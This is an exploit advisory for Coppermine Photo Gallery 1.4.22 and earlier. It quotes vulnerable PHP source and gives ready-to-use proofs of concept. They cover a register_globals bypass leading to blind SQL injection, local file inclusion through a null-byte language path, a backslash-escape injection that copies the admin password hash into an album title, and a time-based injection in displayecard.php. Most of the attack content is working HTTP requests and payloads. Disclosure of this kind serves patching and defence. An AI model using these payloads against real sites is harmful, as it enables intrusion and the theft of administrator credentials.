Coppermine Photo Gallery <= 1.4.22 Multiple Remote Vulnerabilities
==================================================================


Author:	girex

CMS:	Coppermine Photo Gallery <= 1.4.22


Coppermine Foto Gallery suffers from different vulnerabilities.

There is a Local File Inclusion and a Blind SQL Injection working with 
register_globals = On and magic_quotes_gpc = Off
and
a SQL Injection working in case of registration is enabled and a user can create/modify albums 
(default setting if registration is enabled) and php.ini regardless
and 
a Blind SQL Injection when is enabled the ecard logging system 
(that is not a default configuration) and php.ini regardless

Let&#039;s see how do they work...

-------------------------------------------------------------------------------------------

Is possible to bypass the anti-register_global protection and obtain a blind sql injection or a local file inclusion.

I couldn&#039;t find a better way to exploit bypassing the anti-register_global protection so i just write this
Proof of Concepts.

Let&#039;s see the anti-register_globals protection and how to bypass it...

File: /includes/init.inc.php - lines: 42-65

	$keysToSkip = array(&#039;_POST&#039;, &#039;_GET&#039;, &#039;_COOKIE&#039;, &#039;_REQUEST&#039;, &#039;_SERVER&#039;, &#039;HTML_SUBST&#039;, &#039;keysToSkip&#039;, &#039;register_globals_flag&#039;, &#039;cpgdebugger&#039;);
	
	if (ini_get(&#039;register_globals&#039;) == &#039;1&#039; || strtolower(ini_get(&#039;register_globals&#039;)) == &#039;on&#039;) {
	    $register_globals_flag = true;
	} else {
	    $register_globals_flag = false;
	}
	
	if (get_magic_quotes_gpc()) {
	        if (is_array($_POST)) {
	                foreach ($_POST as $key => $value) {
	                        if (!is_array($value))
	                                $_POST[$key] = strtr(stripslashes($value), $HTML_SUBST);
	                        if (!in_array($key, $keysToSkip) && isset($$key) && $register_globals_flag) unset($$key);
	                }
	        }
	
	        if (is_array($_GET)) {
	                foreach ($_GET as $key => $value) {
	                        unset($_GET[$key]);
	                        $_GET[strtr(stripslashes($key), $HTML_SUBST)] = strtr(stripslashes($value), $HTML_SUBST);
	                        if (!in_array($key, $keysToSkip) && isset($$key) && $register_globals_flag) unset($$key);
	                }
	        }

Same happens for $_COOKIE and $_SERVER vars and also with magic_quotes_gpc = off
This protection is easily bypassable defining GLOBALS vars via GET or via POST.

Example: index.php?GLOBALS[dummy_example]=damn
It defines the global var dummy_example.

Let&#039;s see how to exploit it...

File: ./thumbnails.php - lines: 79-

	if (isset($_GET[&#039;sort&#039;])) $USER[&#039;sort&#039;] = $_GET[&#039;sort&#039;];
	if (isset($_GET[&#039;cat&#039;])) $cat = (int)$_GET[&#039;cat&#039;];		<== bypass the int cast 
	if (isset($_GET[&#039;album&#039;])) $album = $_GET[&#039;album&#039;];

	...
	if (is_numeric($album)) {
	...
    	
	} else {
        $album_set_array = array();
        if ($cat == USER_GAL_CAT)
            	$where = &#039;category > &#039; . FIRST_USER_CAT;
       	else
            	$where = "category = &#039;$cat&#039;";

        $result = cpg_db_query("SELECT aid FROM {$CONFIG[&#039;TABLE_ALBUMS&#039;]} WHERE $where");  <==  Vulnerable query


Here&#039;s a proof of concept:
NOTE: - we need register_globals = on and magic_quotes_gpc = off

[target]/[path]/thumnails.php?album=alpha&GLOBALS[cat]=99999&#039; OR 1=1%23	true
[target]/[path]/thumnails.php?album=alpha&GLOBALS[cat]=99999&#039; OR 1=2%23	false

-------------------------------------------------------------------------------------------

It&#039;s also possible to obtain a local file inclusion overwriting $USER array and in particular
$USER[&#039;lang&#039;] vars...

File: /include/functions.inc.php - lines: 128-135

	function user_get_profile()
	{
        	global $CONFIG, $USER;

        	if (isset($_COOKIE[$CONFIG[&#039;cookie_name&#039;].&#039;_data&#039;])) {
                	$USER = @unserialize(@base64_decode($_COOKIE[$CONFIG[&#039;cookie_name&#039;].&#039;_data&#039;]));
                	$USER[&#039;lang&#039;] = strtr($USER[&#039;lang&#039;], &#039;$/\\:*?"\&#039;<>|`&#039;, &#039;____________&#039;);		<== we bypass it
        	}
      
		if (!isset($USER[&#039;ID&#039;]) || strlen($USER[&#039;ID&#039;]) != 32) {
                	list($usec, $sec) = explode(&#039; &#039;, microtime());
                	$seed = (float) $sec + ((float) $usec * 100000);
                	srand($seed);
                	$USER=array(&#039;ID&#039; => md5(uniqid(rand(),1)));
        	} else {
                	$USER[&#039;ID&#039;] = addslashes($USER[&#039;ID&#039;]);
        	}

        	if (!isset($USER[&#039;am&#039;])) $USER[&#039;am&#039;] = 1;
	}

File: /includes/init.inc.php - lines: 318-346

	if (isset($USER[&#039;lang&#039;]) && !strstr($USER[&#039;lang&#039;], &#039;/&#039;) && file_exists(&#039;lang/&#039; . $USER[&#039;lang&#039;] . &#039;.php&#039;))
	{
        	$CONFIG[&#039;default_lang&#039;] = $CONFIG[&#039;lang&#039;];          // Save default language
        	$CONFIG[&#039;lang&#039;] = strtr($USER[&#039;lang&#039;], &#039;$/\\:*?"\&#039;<>|`&#039;, &#039;____________&#039;);
	}
	elseif ($CONFIG[&#039;charset&#039;] == &#039;utf-8&#039;)			<== default configuration
	{
       		include(&#039;include/select_lang.inc.php&#039;);
        	if (file_exists(&#039;lang/&#039; . $USER[&#039;lang&#039;] . &#039;.php&#039;))
        	{
                	$CONFIG[&#039;default_lang&#039;] = $CONFIG[&#039;lang&#039;];      // Save default language
                	$CONFIG[&#039;lang&#039;] = $USER[&#039;lang&#039;];
        	}
	}
	else
	{
        	unset($USER[&#039;lang&#039;]);
	}

	if (isset($CONFIG[&#039;default_lang&#039;]) && ($CONFIG[&#039;default_lang&#039;]==$CONFIG[&#039;lang&#039;]))
	{
                unset($CONFIG[&#039;default_lang&#039;]);
	}

	if (!file_exists("lang/{$CONFIG[&#039;lang&#039;]}.php"))
  	$CONFIG[&#039;lang&#039;] = &#039;english&#039;;

	// We load the chosen language file
	require "lang/{$CONFIG[&#039;lang&#039;]}.php";		<== vulnerable include


Here&#039;s a proof of concept:
NOTE: - we need register_globals = on and magic_quotes_gpc = off

GET /[path]/index.php?GLOBALS[USER][ID]=5b83a5f92603efcdb65d47c9a2991d6b&GLOBALS[USER][lang]=../README.txt%00 HTTP/1.1
Host: [host]
Connection: close

This will include README.txt, if register_globals=on magic_quotes_gpc=off
and if User-Agent and Accept-Language headers are not set. (see code)

-------------------------------------------------------------------------------------------

When registration are enabled and a user can create/modify albums with password is possible 
to obatain a blind sql injection php.ini regardless.

File: ./db_input.php 

	$event = isset($_POST[&#039;event&#039;]) ? $_POST[&#039;event&#039;] : $_GET[&#039;event&#039;];
	switch ($event) {
 
	...

	case &#039;album_update&#039;:
        if (!(USER_ADMIN_MODE || GALLERY_ADMIN_MODE)) cpg_die(ERROR, $lang_errors[&#039;perm_denied&#039;], __FILE__, __LINE__); <== USER_ADMIN_MODE is TRUE if we are logged in

        $aid = (int)$_POST[&#039;aid&#039;];
        $title = addslashes(trim($_POST[&#039;title&#039;]));
        $category = (int)$_POST[&#039;category&#039;];
        $description = addslashes(trim($_POST[&#039;description&#039;]));
                $keyword = addslashes(trim($_POST[&#039;keyword&#039;]));
        $thumb = (int)$_POST[&#039;thumb&#039;];
        $visibility = (int)$_POST[&#039;visibility&#039;];
        $uploads = $_POST[&#039;uploads&#039;] == &#039;YES&#039; ? &#039;YES&#039; : &#039;NO&#039;;
        $comments = $_POST[&#039;comments&#039;] == &#039;YES&#039; ? &#039;YES&#039; : &#039;NO&#039;;
        $votes = $_POST[&#039;votes&#039;] == &#039;YES&#039; ? &#039;YES&#039; : &#039;NO&#039;;
        $password = $_POST[&#039;alb_password&#039;];					<== this var is not addslashed
                $password_hint = addslashes(trim($_POST[&#039;alb_password_hint&#039;]));
        $visibility = !empty($password) ? FIRST_USER_CAT + USER_ID : $visibility;

        if (!$title) cpg_die(ERROR, $lang_db_input_php[&#039;alb_need_title&#039;], __FILE__, __LINE__);

        if (GALLERY_ADMIN_MODE) {
            $query = "UPDATE {$CONFIG[&#039;TABLE_ALBUMS&#039;]} SET title=&#039;$title&#039;, description=&#039;$description&#039;, category=&#039;$category&#039;, thumb=&#039;$thumb&#039;, uploads=&#039;$uploads&#039;, comments=&#039;$comments&#039;, votes=&#039;$votes&#039;, visibility=&#039;$visibility&#039;, alb_password=&#039;$password&#039;, alb_password_hint=&#039;$password_hint&#039;, keyword=&#039;$keyword&#039; WHERE aid=&#039;$aid&#039; LIMIT 1";
        } else {
            $category = FIRST_USER_CAT + USER_ID;
            $query = "UPDATE {$CONFIG[&#039;TABLE_ALBUMS&#039;]} SET title=&#039;$title&#039;, description=&#039;$description&#039;, thumb=&#039;$thumb&#039;,  comments=&#039;$comments&#039;, votes=&#039;$votes&#039;, visibility=&#039;$visibility&#039;, alb_password=&#039;$password&#039;,		<== vulnerable query alb_password_hint=&#039;$password_hint&#039;,keyword=&#039;$keyword&#039; WHERE aid=&#039;$aid&#039; AND category=&#039;$category&#039; LIMIT 1";
        }

        $update = cpg_db_query($query);

$_POST[&#039;alb_password&#039;] is not addslashed before being used in a query.
You must know that all _GET _POST _REQUEST variables are sanizated in init.inc.php...

File: /include/init.inc.php

	// Do some cleanup in GET, POST and cookie data and un-register global vars
	$HTML_SUBST = array(&#039;&&#039; => &#039;&&#039;, &#039;"&#039; => &#039;"&#039;, &#039;<&#039; => &#039;<&#039;, &#039;>&#039; => &#039;>&#039;, &#039;%26&#039; => &#039;&&#039;, &#039;%22&#039; => &#039;"&#039;, &#039;%3C&#039; => &#039;<&#039;, &#039;%3E&#039; => &#039;>&#039;,&#039;%27&#039; => &#039;&#39;&#039;, "&#039;" => &#039;&#39;&#039;); 

	...
	$_POST[$key] = strtr(stripslashes($value), $HTML_SUBST);
	...
	$_GET[strtr(stripslashes($key), $HTML_SUBST)] = strtr(stripslashes($value), $HTML_SUBST);
	...
	$_REQUEST[$key] = strtr(stripslashes($value), $HTML_SUBST);


So quotes are fixed, but what about backslash (\). We can manipulate the query inserting a backslash at the end of
$_POST[&#039;alb_password&#039;] and execute SQL in $_POST[&#039;alb_password_hint&#039;] parameter.


Here&#039;s a Proof of Concept: 
NOTE: - registration must be enabled and an user must can create/modify albums 
      - works regardless of php.ini settings

- Log in with your user credential
- Create an album with password
- Do this request:

POST /[path]/db_input.php HTTP/1.1
Host: [host]
Keep-Alive: 300
Connection: keep-alive
Cookie: [your_cookies]
Content-Type: application/x-www-form-urlencoded

event=album_update&title=x&aid=[YOUR_ALBUM_ID]&alb_password=%5C&alb_password_hint=,title=(SELECT user_password FROM cpg14x_users WHERE user_id=1) WHERE aid=[YOUR_ALBUM_ID]%23

You will set the admin&#039;s password (user with user_id=1) as the title of your album.

-------------------------------------------------------------------------------------------

And we have also a Blind SQL Injection with a specific configuration of coppermine...

File: ./displayecard.php - lines 26-38

	if (!isset($_GET[&#039;data&#039;])) cpg_die(CRITICAL_ERROR, $lang_errors[&#039;param_missing&#039;], __FILE__, __LINE__);

	$data = array();
	$data = @unserialize(@base64_decode($_GET[&#039;data&#039;]));

	// attempt to obtain full link from db if ecard logging enabled and min 12 chars of data is provided and only 1 match
	if ((!is_array($data)) && $CONFIG[&#039;log_ecards&#039;] && (strlen($_GET[&#039;data&#039;]) > 12)) {
        	$result = cpg_db_query("SELECT link FROM {$CONFIG[&#039;TABLE_ECARDS&#039;]} WHERE link LIKE &#039;{$_GET[&#039;data&#039;]}%&#039;");
        	if (mysql_num_rows($result) === 1) {
                	$row = mysql_fetch_assoc($result);
                	$data = @unserialize(@base64_decode($row[&#039;link&#039;]));
        	}
	}


Here&#039;s a Proof of Concept: 
NOTE: - $CONFIG[&#039;log_ecards&#039;] must be set to 1 (and this is NOT a default config) 
      - works regardless of php.ini settings

Make an injection with this php code:
<?php
$injection = "%&#039; OR BENCHMARK(999999, md5(0))#";
$injection = urlencode(base64_encode(serialize($injection)));
?>

Then:
GET http://[host]/[path]/displayecard.php?data=[$injection] HTTP/1.1

girex



